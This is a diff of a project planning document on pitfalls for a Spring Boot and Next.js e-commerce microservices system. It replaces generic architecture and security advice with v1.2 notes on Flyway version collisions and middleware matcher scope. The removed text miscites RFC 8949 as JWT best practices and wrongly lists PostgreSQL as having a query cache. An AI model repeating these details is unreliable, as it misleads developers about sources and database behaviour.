@@ -1,1240 +1,861 @@
-# Domain Pitfalls: Microservices E-Commerce Systems
+# Domain Pitfalls — v1.2 UI/UX Completion
 
-**Domain:** Microservices-based e-commerce platform  
-**Stack:** Spring Boot (backend) + Next.js (frontend)  
-**Team Context:** Students learning architecture patterns  
-**Researched:** April 2026  
+**Domain:** E-commerce microservices (Spring Boot + JPA + Flyway + Postgres + Next.js OpenAPI codegen)
+**Milestone:** v1.2 — Adding 11 visible UI/UX features ON TOP của v1.1 baseline
+**Researched:** 2026-04-26
+**Confidence:** HIGH (grounded trong v1.1 audit + 2 debug sessions thực tế của project)
 
----
-
-## Executive Summary
-
-Microservices e-commerce systems are prone to cascading failures, distributed transaction complexity, and observability gaps that can go undetected until production. This document identifies the critical pitfalls that derail e-commerce microservices and provides concrete detection strategies and prevention techniques for each development phase.
+> **Scope note:** File này chỉ liệt kê pitfalls khi **ADD** các v1.2 features vào hệ thống đã ship v1.1. Generic security advice (OWASP Top 10) bị loại trừ — chỉ giữ lại điểm xảy ra do tương tác giữa feature mới với architecture hiện hữu (microservices boundary, Flyway, OpenAPI codegen, ApiErrorResponse envelope, traceId, middleware matcher).
 
 ---
 
-## ARCHITECTURAL PITFALLS
+## Critical Pitfalls
 
-### Pitfall 1: Over-Engineering with Unnecessary Services
+### Pitfall 1: Flyway V4 collision khi multiple PRs cùng tăng version
 
-**What goes wrong:**  
-Services are created prematurely to achieve microservices "look" rather than solving real problem boundaries. Results in dozens of tiny services with heavy inter-service coupling—effectively a distributed monolith with network calls.
+**What goes wrong:**
+v1.1 đã có incident DB-05: order-service có cả `db/migration/V2__add_order_items.sql` (Phase 8) và `db/seed-dev/V2__seed_dev_data.sql` (Phase 5) cùng version=2 → Flyway nghiêm ngặt sẽ throw "duplicate version" và service không boot. Phải rename V2 → V100. v1.2 thêm Wishlist (user-svc), Reviews (product-svc), Address book (user-svc) — nếu 2 phase plan parallel cùng claim V4__ trên cùng service thì collision lặp lại.
 
 **Why it happens:**
-- Team enthusiasm for microservices without understanding domain boundaries
-- Following deployment architecture (services per team) before business capability decomposition
-- Treating each code file or layer as a service candidate
-- No clear service separation criteria established
+- Flyway version là **monotonic per-service**, nhưng plan-phase agents không có lock tập trung — mỗi agent đọc `ls db/migration` rồi tự pick `next = max+1`.
+- Project có **5 services dùng Flyway** (user, product, order + 2 khác) → namespace tách biệt, nhưng features v1.2 trùng heavily lên user-svc (wishlist + address-book + profile-edit) và product-svc (reviews + filters).
+- Seed data folder (`db/seed-dev/V*__`) và migration folder (`db/migration/V*__`) đang share namespace ở Flyway default config → collision cross-folder như v1.1.
 
-**Consequences:**
-- Increased network latency and failure points
-- Complex service mesh configuration needed
-- Harder to trace bugs across services
-- Operational overhead explodes (20 services = 20 deployment pipelines, 20 configurations, 20 monitoring systems)
-- Team context-switching across many codebases
-
-**Warning signs (detect early):**
-- Service has only 1-2 endpoints or 1-2 domain concepts
-- Services are stateless pass-throughs (no real business logic)
-- More time spent on inter-service communication than business logic
-- Service deployment doesn't correspond to team structure or business capabilities
-- Hard to explain what one service is "responsible for" in business terms
-
-**Prevention:**
-- **Design phase:** Decompose around business capabilities first (Order Management, Inventory, Payments), not technical layers
-- Use bounded contexts from Domain-Driven Design to define service boundaries
-- Start with 3-4 core services minimum; expand only when service responsibility grows beyond team capacity or change frequency diverges
-- Document each service's domain, responsibilities, and why it exists
-- Use [microservices.io decomposition patterns](https://microservices.io/patterns/decomposition/decompose-by-business-capability.html)
-- Rule: Each service should be independently deployable and handle a complete business capability
-
-**Which phase to address:**
-- **Architecture phase (MVP):** Critical—decide on core services before building
-- Test decomposition with domain experts before implementation
-- Refactor if wrong, but catch it early (month 1-2, not month 6)
-
----
-
-### Pitfall 2: Tight Coupling Between Services
-
-**What goes wrong:**  
-Services depend on internal implementation details of other services (hardcoded URLs, brittle request payloads, synchronous cascading calls). Changing one service breaks others.
-
-**Why it happens:**
-- Direct HTTP calls without abstraction (REST endpoints tightly coupled to internal domain models)
-- Shared libraries that expose internal structures across service boundaries
-- No versioning strategy or backward compatibility thinking
-- Request objects leaked from one service to another
-
-**Consequences:**
-- Cannot deploy services independently (one change cascades)
-- Service updates become coordination events across teams
-- Debugging becomes chain tracing (A calls B calls C calls D)
-- Difficult to scale individual services without changing contracts
-- One service failure affects all consumers
+**How to avoid:**
+- Reserve version ranges trong `MILESTONES.md` v1.2 section, **assign explicit V-number per feature** trước khi plan-phase chạy:
+  - user-svc: V4 wishlist, V5 address_book, V6 profile_avatar_url, V7 user_phone (nếu thiếu)
+  - product-svc: V4 reviews, V5 review_aggregates (denormalized rating average + count)
+  - order-svc: V4 order_filters_index (composite index status+createdAt+userId)
+- Tách `db/migration` (production) và `db/seed-dev` (dev-only) bằng riêng `flyway.locations` per profile, KHÔNG share namespace.
+- Pre-commit hook check `find sources/*-service/src/main/resources/db -name "V*__*.sql" | awk -F'V|__' '{print $1"_"$2}' | sort | uniq -d` — fail nếu có duplicate.
 
 **Warning signs:**
-- Service A imports or directly references Service B's domain objects
-- Changing a service's internal SQL/ORM model breaks clients
-- Request payloads include fields that aren't needed but are included "just in case"
-- Services use each other's internal DTOs directly
-- API contracts aren't versioned; new fields break existing clients
+- 2 PR cùng touch `V4__` trên cùng service folder.
+- Service không boot, log: `FlywayException: Found more than one migration with version 4`.
+- Local `mvn spring-boot:run` OK nhưng CI fail (CI thường strict hơn về `validateOnMigrate`).
 
-**Prevention:**
-- **Define service contracts explicitly:** Use OpenAPI/Swagger for REST APIs; define event schemas for async communication
-- **Implement Tolerant Reader pattern:** Services accept and ignore unknown fields; only require essential data
-- **Version APIs:** Include version in endpoint URL (`/v1/orders`, `/v2/orders`) or accept version header
-- **Use external DTOs for contracts:** Never leak service-internal models across boundaries
-- **Async first for cross-service communication:** Use events/messages instead of synchronous REST calls where possible
-- **Document breaking changes:** Communicate before deploying breaking API changes
-- Reference: [12-factor app #4: Treat backing services as attached resources](https://12factor.net/backing-services)
-
-**Which phase to address:**
-- **API Design phase:** Define stable service contracts with versioning BEFORE implementation
-- **Every deployment:** Check for backward compatibility before deploying
+**Phase to address:** Roadmap setup phase (trước khi spawn plan-phase agents) — register version ranges. Plus: post-merge integration phase verify all services boot.
 
 ---
 
-### Pitfall 3: Shared Database Across Services
+### Pitfall 2: AUTH-06 middleware matcher quá broad → static asset bị gate
 
-**What goes wrong:**  
-Multiple services read/write the same database—creates hidden coupling and distributed transaction problems. Changes to schema affect all consumers; transaction isolation becomes nightmare.
-
-**Why it happens:**
-- "Reuse" mindset from monolith development
-- Ease of sharing data in SQL joins
-- Unclear service boundaries (service A and B both own "customer" data)
-- Performance optimization (avoiding service calls by direct DB access)
-
-**Consequences:**
-- Cannot scale individual services independently (database becomes bottleneck)
-- Schema changes require coordination across teams
-- Circular dependencies (service A modifies schema; service B breaks)
-- Distributed transaction complexity (2PC doesn't work in microservices)
-- Data integrity violations go undetected until production
-
-**Warning signs:**
-- Multiple services connect to same database with same credentials
-- Services JOIN data from tables owned by other services
-- Schema changes documented as "notify all teams"
-- Transaction logs show cross-service database locks
-- Different services own different tables in same database (no logical separation)
-
-**Prevention:**
-- **Enforce database per service:** Each service owns and manages its database exclusively
-- When service B needs data from service A, service B calls service A's API—does NOT query service A's database
-- **Implement Saga pattern for cross-service transactions:** Orchestration or choreography-based sagas instead of distributed 2PC
-- Use [Saga pattern](https://microservices.io/patterns/data/saga.html) with either:
-  - **Choreography:** Services publish events (Order Created → Inventory Service listens → reserves stock)
-  - **Orchestration:** Saga coordinator orchestrates steps (CreateOrderSaga directs steps)
-- For data replication needs, use event-driven sync (service A publishes events; service B subscribes and maintains read replica)
-- Reference: [Database per Service pattern](https://microservices.io/patterns/data/database-per-service.html)
-
-**Which phase to address:**
-- **Data modeling phase:** Decide database boundaries with service boundaries
-- **Every service addition:** Review and enforce database ownership
-
----
-
-### Pitfall 4: Missing Circuit Breakers and Timeouts
-
-**What goes wrong:**  
-Service A calls Service B; Service B is slow or down. Service A threads wait forever (or very long). Threads exhaust; Service A becomes unresponsive to all requests. Failure cascades upstream.
+**What goes wrong:**
+v1.1 closed AUTH-06 ở mức narrow (`['/admin/:path*']` chỉ). v1.2 muốn mở rộng `/account|/profile|/checkout`. Naïve approach: `matcher: ['/((?!_next/static|_next/image|favicon.ico).*)']` → middleware chạy cho **mọi route** kể cả homepage, dẫn đến SSR slowdown + auth check trên `/api/healthz`. Ngược lại nếu quá narrow (`['/profile/:path*']`) → bypass `/profile` chính nó (Next.js matcher KHÔNG auto-include parent path), user direct visit `/profile` không bị bounce.
 
 **Why it happens:**
-- "It's internal; we trust the network" (network is unreliable)
-- No timeout configured on HTTP clients
-- No fallback logic for failed calls
-- Synchronous service calls without resilience patterns
-- Testing only happy path (service B is always up)
-
-**Consequences:**
-- One slow service brings down entire system
-- Resource exhaustion (thread pools empty)
-- Requests pile up in queue; eventual crash
-- Recovery is slow (manual restart needed)
-- Cascading failures across entire platform
-
-**Warning signs:**
-- Service response times spike unexpectedly
-- Thread pool logs show "Waiting for response from Service B"
-- Memory usage climbs during peak load (requests accumulating)
-- One service outage takes down multiple dependent services
-- No timeout exceptions in logs; just hangs
-
-**Prevention:**
-- **Implement Circuit Breaker pattern:** Use Netflix Hystrix, Resilience4j, or Spring Cloud CircuitBreaker
-  - If failure rate exceeds threshold (e.g., 50% failed requests), circuit "trips"
-  - Subsequent requests fail immediately (fail-fast) instead of waiting
-  - After timeout period, allow test requests; if successful, reset circuit
-- **Set explicit timeouts:** All HTTP calls must have connection timeout + read timeout
-  - Example: 5s connection timeout, 10s read timeout
-  - Prevent threads from hanging indefinitely
-- **Implement bulkheads:** Separate thread pools for different services
-  - Service A calls Service B and Service C; don't use shared thread pool
-  - If Service B exhausts its pool, doesn't affect Service C calls
-- **Provide fallbacks:** For circuit-open state, return cached data or sensible default
-  - Order service can't reach Inventory service? Return "inventory check pending" instead of failing order creation
-- **Test failure scenarios:** Chaos engineering—deliberately break services to verify resilience
-- Reference: [Circuit Breaker pattern](https://microservices.io/patterns/reliability/circuit-breaker.html)
-
-**Which phase to address:**
-- **Service communication phase:** Configure circuit breakers before first inter-service calls
-- **Load testing:** Verify behavior under failure before production
-
----
-
-### Pitfall 5: N+1 Query Problems in Service Calls
-
-**What goes wrong:**  
-Service A needs data from Service B for multiple records. Instead of batch call, loops and calls Service B once per record. Client: N records → N service calls. Linear degradation of performance.
-
-**Why it happens:**
-- Treating service calls like in-process function calls (they're not—network is expensive)
-- No batch query API on downstream service
-- Tight loop: `for (order in orders) { customer = getCustomer(order.customerId); }`
-- Misunderstanding that service calls have ~100x latency vs in-process calls
-
-**Consequences:**
-- Service performance collapses with 100+ orders (100 service calls + network overhead)
-- Upstream service becomes bottleneck on downstream service
-- Cascading latency: if Order service does N calls to Customer service, and Customer service does M calls to Inventory service, total is N×M calls
-- Timeouts trigger; requests fail
-
-**Warning signs:**
-- Service call count doesn't match record count (should be roughly 1:1, not N:1)
-- Latency per request scales linearly with number of related records
-- Logs show same downstream service called repeatedly in short time
-- Load testing with 100 records shows 10× latency vs 10 records
-
-**Prevention:**
-- **Batch queries:** Provide batch endpoints for related data
-  - `GET /customers/{ids}` instead of looping `GET /customers/{id}`
-  - Return all customers in single call
-- **API Composition pattern:** Aggregate data at API Gateway or BFF layer
-  - API Gateway fetches Order list, then single batch call to Customer service for all customer data
-  - Single network roundtrip instead of N roundtrips
-- **Event-driven data sync:** If same data queried repeatedly, sync it to local read replica
-  - Order service maintains local cache of customer names (updated via Customer domain events)
-  - No service calls needed for read-only customer data
-- **Denormalization:** Duplicate non-frequently-changing data in calling service's database
-  - Order record includes customer name (denormalized)
-  - When customer name changes, event triggers update in Order service
-- **GraphQL or similar:** For flexible query patterns, use GraphQL to prevent over-fetching/under-fetching
-
-**Which phase to address:**
-- **Query optimization phase:** Profile API calls before performance testing
-- **Load testing:** Identify N+1 problems early with realistic data volumes
-
----
-
-## DATA & CONSISTENCY PITFALLS
-
-### Pitfall 6: Distributed Transaction Complexity (2PC Attempts)
-
-**What goes wrong:**  
-Team attempts distributed transactions using 2PC (two-phase commit) across multiple services. 2PC is blocking, slow, and unreliable in distributed systems. Creates deadlocks, poor performance, high failure rates.
-
-**Why it happens:**
-- Monolith mindset: "ACID transactions worked before; use 2PC"
-- Misunderstanding distributed systems: network failures, partial failures aren't rare
-- Pressure for immediate consistency (must return success immediately)
-- Lack of awareness of Saga pattern alternative
-
-**Consequences:**
-- 2PC blocks all participants while coordinator makes decision; system becomes unresponsive
-- Network partition = deadlock (participants waiting for coordinator decision)
-- Failure rates increase significantly (more participants = more failure points)
-- Rollback is complex and slow
-- System violates CAP theorem and loses availability
-
-**Warning signs:**
-- Database logs show long-held locks or XA protocol transactions
-- Order creation takes 5+ seconds (blocked on 2PC)
-- Timeouts increase during load testing
-- "Distributed transaction timeout" errors in logs
-- Multiple services with shared transaction coordinator
-
-**Prevention:**
-- **Use Saga pattern instead:** Sagas are sequences of local transactions, not distributed 2PC
-  - Each service performs local transaction + publishes event
-  - Next service listens to event and performs its transaction
-  - If step fails, saga executes compensating transactions (undo previous steps)
-- **Two approaches:**
-  - **Choreography:** Services publish events; subscribers react autonomously (simpler, harder to visualize)
-  - **Orchestration:** Saga orchestrator coordinates steps explicitly (centralized, easier to understand flow)
-- **Eventual consistency:** Accept that consistency takes time; design for eventual convergence
-- **Idempotency:** Ensure operations can be repeated without side effects (safe for retries)
-- Reference: [Saga pattern](https://microservices.io/patterns/data/saga.html), Martin Fowler on [distributed transactions](https://martinfowler.com/articles/microservices.html#APIgatewaysandatamanagement)
-
-**Which phase to address:**
-- **Transaction design phase:** Choose Saga over 2PC during requirements
-- **Proof of concept:** Build sample saga flow before implementation
-
----
-
-### Pitfall 7: Eventual Consistency Confusion
-
-**What goes wrong:**  
-Team doesn't understand eventual consistency. Implements saga correctly but fails to handle stale reads, dirty reads, or anomalies that appear before consistency arrives. Users see conflicting data.
-
-**Why it happens:**
-- Assumption: "After saga completes, all data is consistent" (false—intermediate states exist)
-- No isolation level specified for reads (read-uncommitted races)
-- Cache invalidation not implemented
-- UI assumes reads reflect writes immediately
-
-**Consequences:**
-- User creates order; sees "order not found" briefly (inventory sync not yet complete)
-- Order shows status "pending" then "confirmed" then "pending" again (race between saga steps)
-- Payment service approves; Order service hasn't received event yet; user sees "payment pending"
-- Double-charging or overselling (inconsistent reads during saga execution)
-
-**Warning signs:**
-- Users report state inconsistencies: "Order was confirmed then disappeared"
-- Race condition bugs that only appear under load
-- Cache invalidation race conditions (UI shows stale state)
-- Timing-dependent test failures (same test fails sometimes, passes others)
-- Events arriving out of order or duplicated
-
-**Prevention:**
-- **Understand isolation anomalies:** Recognize dirty reads, non-repeatable reads, phantom reads
-  - Design sagas to tolerate these anomalies
-  - Use compensating transactions to handle conflicting concurrent sagas
-- **Version data:** Include version/timestamp in records
-  - Order has version=1; saga increments to version=2
-  - Optimistic locking prevents stale reads
-- **Separate reads from writes:** Use CQRS for frequently-read data
-  - Write service handles saga mutations
-  - Read service maintains eventual-consistency read model
-  - UI queries read model (accepts staleness window of seconds)
-- **Assume events are duplicated/reordered:**
-  - Make operations idempotent (same event processed twice = same result)
-  - Handle out-of-order events gracefully
-- **Communicate staleness to users:** "Order confirmed. Inventory sync in progress (usually <2s)"
-- **Set staleness budget:** Define max age of data acceptable (e.g., 5s for inventory, 30s for analytics)
-
-**Which phase to address:**
-- **Data consistency phase:** Define consistency requirements before saga implementation
-- **Testing:** Test with delayed/reordered events to catch anomalies
-
----
-
-### Pitfall 8: Data Synchronization Between Services (Event Failure)
-
-**What goes wrong:**  
-Event publishing fails silently or events are lost. Service A publishes "Order Created" event; Service B never receives it. Inventory never decreases; Customer service never receives notification. Silent data divergence.
-
-**Why it happens:**
-- Event published to message broker, but message broker crashes before delivery
-- Transactional outbox pattern not implemented
-- Event delivery not idempotent; duplicate events processed as separate transactions
-- Message broker failure not monitored
-- No dead-letter queue for unprocessable events
-
-**Consequences:**
-- Inventory oversells (order created, but inventory not decremented)
-- Customer sees order but no payment received
-- Subtle data corruption (hard to detect, easy to miss)
-- Silent failures (no exception thrown, but operation incomplete)
-- Eventual consistency never arrives (data permanently diverged)
-
-**Warning signs:**
-- Order count != Payment count (unmatched orders)
-- Inventory numbers inconsistent across services
-- Event processing exceptions silently logged but not handled
-- Dead-letter queue accumulating messages
-- Gap between "Order Created" events and "Customer Notified" events
-
-**Prevention:**
-- **Use Transactional Outbox pattern:**
-  - Persist domain event in same database transaction as mutation
-  - Separate process polls table and publishes events to message broker
-  - Ensures write and publish are atomic; no loss
-- **Use Event Sourcing:** Store events as primary source of truth
-  - Replay events to reconstruct state
-  - No "sync" needed; all derived state computed from events
-- **Idempotent event processing:** Same event processed twice = same result
-  - Use event ID + service ID as dedup key
-  - Idempotency token in requests
-- **Dead-letter queues:** Failed events go to DLQ for manual review
-- **Monitoring:** Alert on event lag between services (publish time vs. consumption time)
-- Reference: [Transactional Outbox pattern](https://microservices.io/patterns/data/transactional-outbox.html), [Event Sourcing](https://microservices.io/patterns/data/event-sourcing.html)
-
-**Which phase to address:**
-- **Event architecture phase:** Decide on outbox or event sourcing before event implementation
-- **Testing:** Test message broker failures; verify recovery
-
----
-
-### Pitfall 9: Cascading Failures and Timeout Storms
-
-**What goes wrong:**  
-Service A times out waiting for Service B. Service A retries (exponential backoff not configured). Retry storms hit Service B. Service B overloaded, times out to Service C. Cascade continues; entire system collapses.
-
-**Why it happens:**
-- No exponential backoff; immediate retries
-- No retry limit; retries forever
-- No bulkhead isolation; shared thread pool
-- Service B overload not detected; requests keep queuing
-
-**Consequences:**
-- Entire system becomes unresponsive
-- Recovery takes minutes (manual intervention needed)
-- Error rates spike to 100%
-- Resource exhaustion (memory, file descriptors)
-- Cascading outage across entire platform
-
-**Warning signs:**
-- Request latency spikes suddenly from 200ms to 5000ms+
-- Error rate jumps from 0% to 50%+ in seconds
-- "Too many open files" or memory exhaustion errors
-- Logs show rapid retry loops
-- CPU spikes as system retries failures
-
-**Prevention:**
-- **Exponential backoff with jitter:**
-  ```
-  delay = min(baseDelay * 2^attempts + random(0, 1000ms), maxDelay)
-  ```
-  - First retry: 100ms, then 200ms, 400ms, 800ms, 1.6s, max 30s
-  - Random jitter prevents thundering herd
-- **Circuit breaker:** Stop retrying when service is down
-  - After N consecutive failures, fail-fast instead of retrying
-  - Gives service time to recover
-- **Bulkheads:** Separate thread pools per service
-  - Service A→B calls use threadpool-AB (10 threads)
-  - Service A→C calls use threadpool-AC (10 threads)
-  - If B is down, C is unaffected
-- **Deadline propagation:** Timeouts flow through call chain
-  - Client has 30s deadline
-  - Service A calls B with 25s deadline (leave margin)
-  - Service B calls C with 20s deadline
-  - Prevents waste on doomed requests
-- **Graceful degradation:** Return cached/default response instead of failing
-- Reference: [Microservices: Design for failure](https://martinfowler.com/articles/microservices.html#DesignForFailure)
-
-**Which phase to address:**
-- **Communication configuration:** Implement exponential backoff, circuit breaker, bulkheads in all clients
-- **Load testing:** Trigger failures; verify cascade prevention
-
----
-
-## SECURITY PITFALLS
-
-### Pitfall 10: Service-to-Service Authentication Gaps
-
-**What goes wrong:**  
-Service A calls Service B without authentication. Any service (or external attacker) can impersonate Service A, access Service B data, perform operations as Service A.
-
-**Why it happens:**
-- "Internal network; must be safe" (false—insider threats, compromised containers)
-- Assuming network firewall is sufficient (it's not—lateral movement)
-- Overlooking service discovery: how does Service B know Service A is legitimate?
-- No mutual TLS or token validation implemented
-
-**Consequences:**
-- Lateral movement: Attacker compromises one service; gains access to all
-- Service impersonation: Attacker calls Inventory service as Order service; deletes stock
-- Data breach: All service data accessible via unguarded APIs
-- Compliance violation: No audit trail of who called whom
-
-**Warning signs:**
-- Service-to-service API calls have no authorization header
-- Service B accepts requests without verifying caller identity
-- Network traffic unencrypted (HTTP instead of HTTPS)
-- No service-to-service token or certificate validation
-- Service discovery returns all services accessible to all other services
-
-**Prevention:**
-- **Mutual TLS (mTLS):** Each service has certificate; validates peer certificates
-  - Service mesh (Istio, Linkerd) handles mTLS automatically
-  - Or manual: configure TLS on all service endpoints
-- **Service-to-service tokens:** API Gateway issues signed JWT token to calling service
-  - Token includes caller service identity + scopes
-  - Calling service includes token in requests to other services
-  - Receiving service validates signature + checks caller identity
-- **Service identity verification:** Service registry authenticates service registration
-  - Only services with valid certificate can register
-  - Service discovery only returns services to authenticated callers
-- **Zero-trust networking:** Assume internal network is compromised
-  - Encrypt all traffic (mTLS)
-  - Authenticate all requests (service-to-service tokens)
-  - Authorize all requests (service B checks if service A has permission)
-- Reference: [Access Token pattern](https://microservices.io/patterns/security/access-token.html), [12-factor: Backing services](https://12factor.net/backing-services)
-
-**Which phase to address:**
-- **Architecture phase:** Design service identity and authentication before building
-- **First service-to-service call:** Implement mTLS or token validation immediately
-
----
-
-### Pitfall 11: API Gateway Security Misconfiguration
-
-**What goes wrong:**  
-API Gateway is single entry point but security misconfigured. Gateway doesn't validate JWTs correctly, allows invalid tokens, doesn't enforce HTTPS, doesn't rate-limit. Attackers bypass all downstream security.
-
-**Why it happens:**
-- Assumption: "API Gateway is just routing; security is downstream"
-- JWT validation not enabled or configured incorrectly (wrong secret, no expiry check)
-- HTTPS not enforced (HTTP traffic logged with tokens)
-- Rate limiting disabled or too permissive
-- CORS misconfigured (allows requests from anywhere)
-
-**Consequences:**
-- Attackers bypass authentication entirely
-- Brute force attacks on login endpoints (no rate limiting)
-- Token expiry not enforced; stolen old tokens still work
-- HTTPS downgrade attacks (tokens in plaintext)
-- CSRF attacks (CORS allows cross-site requests)
-
-**Warning signs:**
-- API Gateway accepts invalid or expired JWTs
-- HTTP traffic (not HTTPS) observed on API Gateway
-- Same IP address making 1000s of requests (no rate limiting)
-- CORS allows `*` (all origins)
-- JWT secret hardcoded or default value used
-
-**Prevention:**
-- **JWT validation:** Gateway must validate:
-  - Signature (using published secret/public key)
-  - Expiry (token must not be expired)
-  - Issuer (token issued by trusted auth service)
-  - Audience (token for this service, not another)
-  - Configure leeway for clock skew (30s max)
-- **Enforce HTTPS:** No HTTP allowed; redirect HTTP→HTTPS
-- **Rate limiting per IP:** Prevent brute force
-  - 10 failed login attempts → IP blocked for 15 minutes
-  - 100 requests/minute per IP → 429 Too Many Requests
-- **CORS restrictions:** Only allow requests from known frontend domains
-  - Not `*` (all origins)
-  - Explicit whitelist of allowed origins
-- **Secure token handling:**
-  - Tokens in Authorization header (not URL query params)
-  - HttpOnly cookies for web browsers (prevents XSS access)
-  - No tokens in logs or error messages
-- **Health check bypass:** Some endpoints (e.g., `/health`) bypass security (needed for load balancer)
-  - Explicitly allow health checks without auth
-  - Don't expose sensitive endpoints without auth
-
-**Which phase to address:**
-- **API Gateway setup:** Configure authentication + HTTPS before first deployment
-- **Security review:** Manual audit of gateway configuration
-
----
-
-### Pitfall 12: Token/Session Management Chaos
-
-**What goes wrong:**  
-Tokens/sessions managed inconsistently across services. One service validates JWT properly; another trusts any token with correct format. Session token format differs per service. Logout doesn't invalidate tokens everywhere.
-
-**Why it happens:**
-- Each service team implements security independently
-- No shared library or standard for token validation
-- JWT lifetime set inconsistently (1 hour vs 7 days)
-- Logout clears local session but doesn't revoke JWT
-- Refresh token mechanism not implemented
-
-**Consequences:**
-- User logs out; old JWT still valid for 7 days (service B trusts JWT, doesn't check revocation)
-- One service requires login every hour; another has 7-day session (inconsistent UX)
-- Token format incompatible between services (one expects JTI claim, another doesn't)
-- Compromised token remains valid indefinitely (no revocation mechanism)
-- Cross-service session handling broken
-
-**Warning signs:**
-- Different token expiry times across services
-- User logout doesn't sign out all services
-- Stolen token remains valid long after discovery
-- Session format varies between services
-- No refresh token implementation (long-lived tokens for security)
-
-**Prevention:**
-- **Centralized auth service:** Single service issues all tokens, validates all tokens
-  - All services call auth service to validate token (or use cached public key)
-  - Token format standardized (specific claims required)
-  - Single source of truth for token lifetime
-- **Standard claims in JWT:**
-  - `sub` (subject): user ID
-  - `exp` (expiry): absolute timestamp
-  - `iat` (issued at): token creation time
-  - `jti` (JWT ID): unique token ID for revocation
-  - All services validate these identically
-- **Short-lived access tokens + refresh tokens:**
-  - Access token: 15 minutes (short; limited exposure if stolen)
-  - Refresh token: 7 days (long-lived; used to get new access token)
-  - On logout, both tokens invalidated
-  - Refresh token stored server-side; revoked immediately
-- **Token revocation:**
-  - Store invalidated token JTI in cache (Redis) with expiry = token exp time
-  - Before accepting token, check if JTI in revocation cache
-  - Logout adds JTI to cache
-- **Use libraries:** Don't implement JWT validation manually; use proven libraries
-  - Spring Security with OAuth2 / OIDC
-  - Auth0, Keycloak for centralized auth
-- Reference: [JWT best practices](https://tools.ietf.org/html/rfc8949), OWASP
-
-**Which phase to address:**
-- **Authentication design:** Choose centralized auth + token strategy before building
-- **First login implementation:** Get token management right from start
-
----
-
-### Pitfall 13: Input Validation Inconsistencies
-
-**What goes wrong:**  
-Services validate input inconsistently. Service A checks email format; Service B doesn't. Service A rejects negative quantities; Service B doesn't. Leads to data corruption and security exploits.
-
-**Why it happens:**
-- No shared validation library or specification
-- Each service team validates independently
-- Validation logic lives in multiple places (client, API, database)
-- Client-side validation assumed sufficient (it's not—can be bypassed)
-
-**Consequences:**
-- SQL injection (Service B doesn't validate input; passes to SQL)
-- XSS attacks (Service B doesn't sanitize output; user data rendered unsanitized)
-- Data corruption (negative quantities, invalid emails stored)
-- Business logic errors (Service A expects email; gets empty string)
-- Security bypasses (email validation bypassed on one service)
-
-**Warning signs:**
-- Validation error messages vary between services
-- Database contains invalid data (negative quantities, malformed emails)
-- Security scan reports injection vulnerabilities
-- Client-side validation only; server-side missing
-- No unit tests for validation logic
-
-**Prevention:**
-- **Server-side validation only:** Client validation is UX improvement, not security
-  - Always validate on server before persistence/use
-  - Never trust client input
-- **Shared validation library:** All services use same validation rules
-  - Create validation library (e.g., `ptit-validators`) with common rules
-    - Email format
-    - Quantity ≥ 0
-    - Name length 1-255
-    - etc.
-  - All services import and use shared validators
-- **Input sanitization:** Remove/escape dangerous characters
-  - SQL: Use parameterized queries (never string concatenation)
-  - HTML: Escape HTML entities in user data
-  - URLs: Encode special characters
-- **Explicit whitelist:** Only allow known-good characters
-  - Email: alphanumeric + special chars `+.-_@`
-  - Quantity: digits only
-  - Name: letters, spaces, hyphens
-- **Database schema validation:** Add constraints to database
-  - NOT NULL, CHECK (quantity > 0), UNIQUE, FOREIGN KEY
-  - Database enforces rules even if application validation bypassed
-- **Logging:** Log validation failures (potential attacks)
-  - Alert on suspicious patterns (repeated SQL injection attempts)
-
-**Which phase to address:**
-- **Validation library creation:** Build before any service implementation
-- **Every API endpoint:** Validate all inputs before use
-
----
-
-## PERFORMANCE PITFALLS
-
-### Pitfall 14: Chatty Service Communication
-
-**What goes wrong:**  
-Services exchange many small messages instead of batching. Order Service calls Inventory Service 1000s of times per second (once per product). Network overhead dominates; latency explodes.
-
-**Why it happens:**
-- Treating service calls like in-process calls (they're not)
-- N+1 query pattern (loop and call for each record)
-- Lack of API design discipline
-- Fine-grained APIs encourage chatty clients
-
-**Consequences:**
-- Latency proportional to number of services involved (call overhead multiplies)
-- Network bandwidth consumed by message headers (actually larger than payload)
-- Timeout cascades (one slow service times out; retry storms)
-- System becomes latency-sensitive; any delay cascades
-
-**Warning signs:**
-- Service call count doesn't match business operation (should be ~1 call per operation, not 1000)
-- Network traffic overhead > 50% of payload
-- Latency increases linearly with data volume (10 records = 10 calls, 100 records = 100 calls)
-- CPU high but utilization low (threads waiting for network)
-
-**Prevention:**
-- **Batch APIs:** Multiple records per request
-  - `GET /customers?ids=1,2,3` returns all customers in one call
-  - `POST /inventory/check` with array of product IDs
-- **Async/Fire-and-forget:** For non-critical operations
-  - Don't wait for response; return immediately
-  - Process asynchronously (event-driven)
-- **API composition:** Client specifies relationships to fetch
-  - `GET /orders?include=customer,items` fetches order + customer + items in single call
-  - Prevent need for multiple service calls
-- **Caching:** Reduce repeated calls
-  - Cache customer data locally (refresh every 5 minutes)
-  - Cache doesn't need real-time accuracy for read-only data
-- **GraphQL or similar:** Query language specifying exactly what data needed
-  - Prevents over-fetching (unnecessary fields) and under-fetching (need multiple queries)
-- Reference: [12-factor: Backing services](https://12factor.net/backing-services)
-
-**Which phase to address:**
-- **API design:** Design batch endpoints before implementation
-- **Load testing:** Measure service call count and latency; identify chatty patterns
-
----
-
-### Pitfall 15: Inadequate Caching Strategies
-
-**What goes wrong:**  
-Services don't cache, or cache incorrectly. Every request queries database, hits downstream service, or recomputes. High latency; database overloaded.
-
-**Why it happens:**
-- "Caching is hard; avoid it" (false—caching is essential)
-- Cache invalidation not implemented
-- Cache hit rate low because cache key wrong or TTL too short
-- Stale data served without acknowledgment to user
-
-**Consequences:**
-- Database CPU maxed; requests timeout
-- Unnecessary service calls flood network
-- User experience slow (all requests hit database)
-- Downstream service throttles (overload)
-- Cost high (more compute to handle cache misses)
-
-**Warning signs:**
-- Database query count high; cache hit rate low
-- Latency increases during peak hours (cache effect)
-- Same query executed thousands of times per second
-- Database CPU at 80%+ but requests fast (cache would help)
-- No Cache-Control headers or TTL configuration
-
-**Prevention:**
-- **Cache taxonomy:**
-  - **L1 local cache:** In-process (fast, limited size)
-    - Use for data that never changes or changes rarely
-    - Loaded on service startup; kept in memory
-    - Example: feature flags, configuration
-  - **L2 distributed cache:** Redis/Memcached (shared across service instances)
-    - Use for frequently-accessed data (user profiles, product details)
-    - TTL typically 1-5 minutes
-    - Example: customer data, inventory counts
-  - **L3 database cache:** Database query cache (database-level)
-    - Some databases cache query results automatically
-    - Example: PostgreSQL, MySQL query cache
-- **Cache invalidation strategies:**
-  - **TTL (Time-to-Live):** Cache expires after N seconds (simple, may serve stale data)
-  - **Event-driven:** When data changes, event invalidates cache
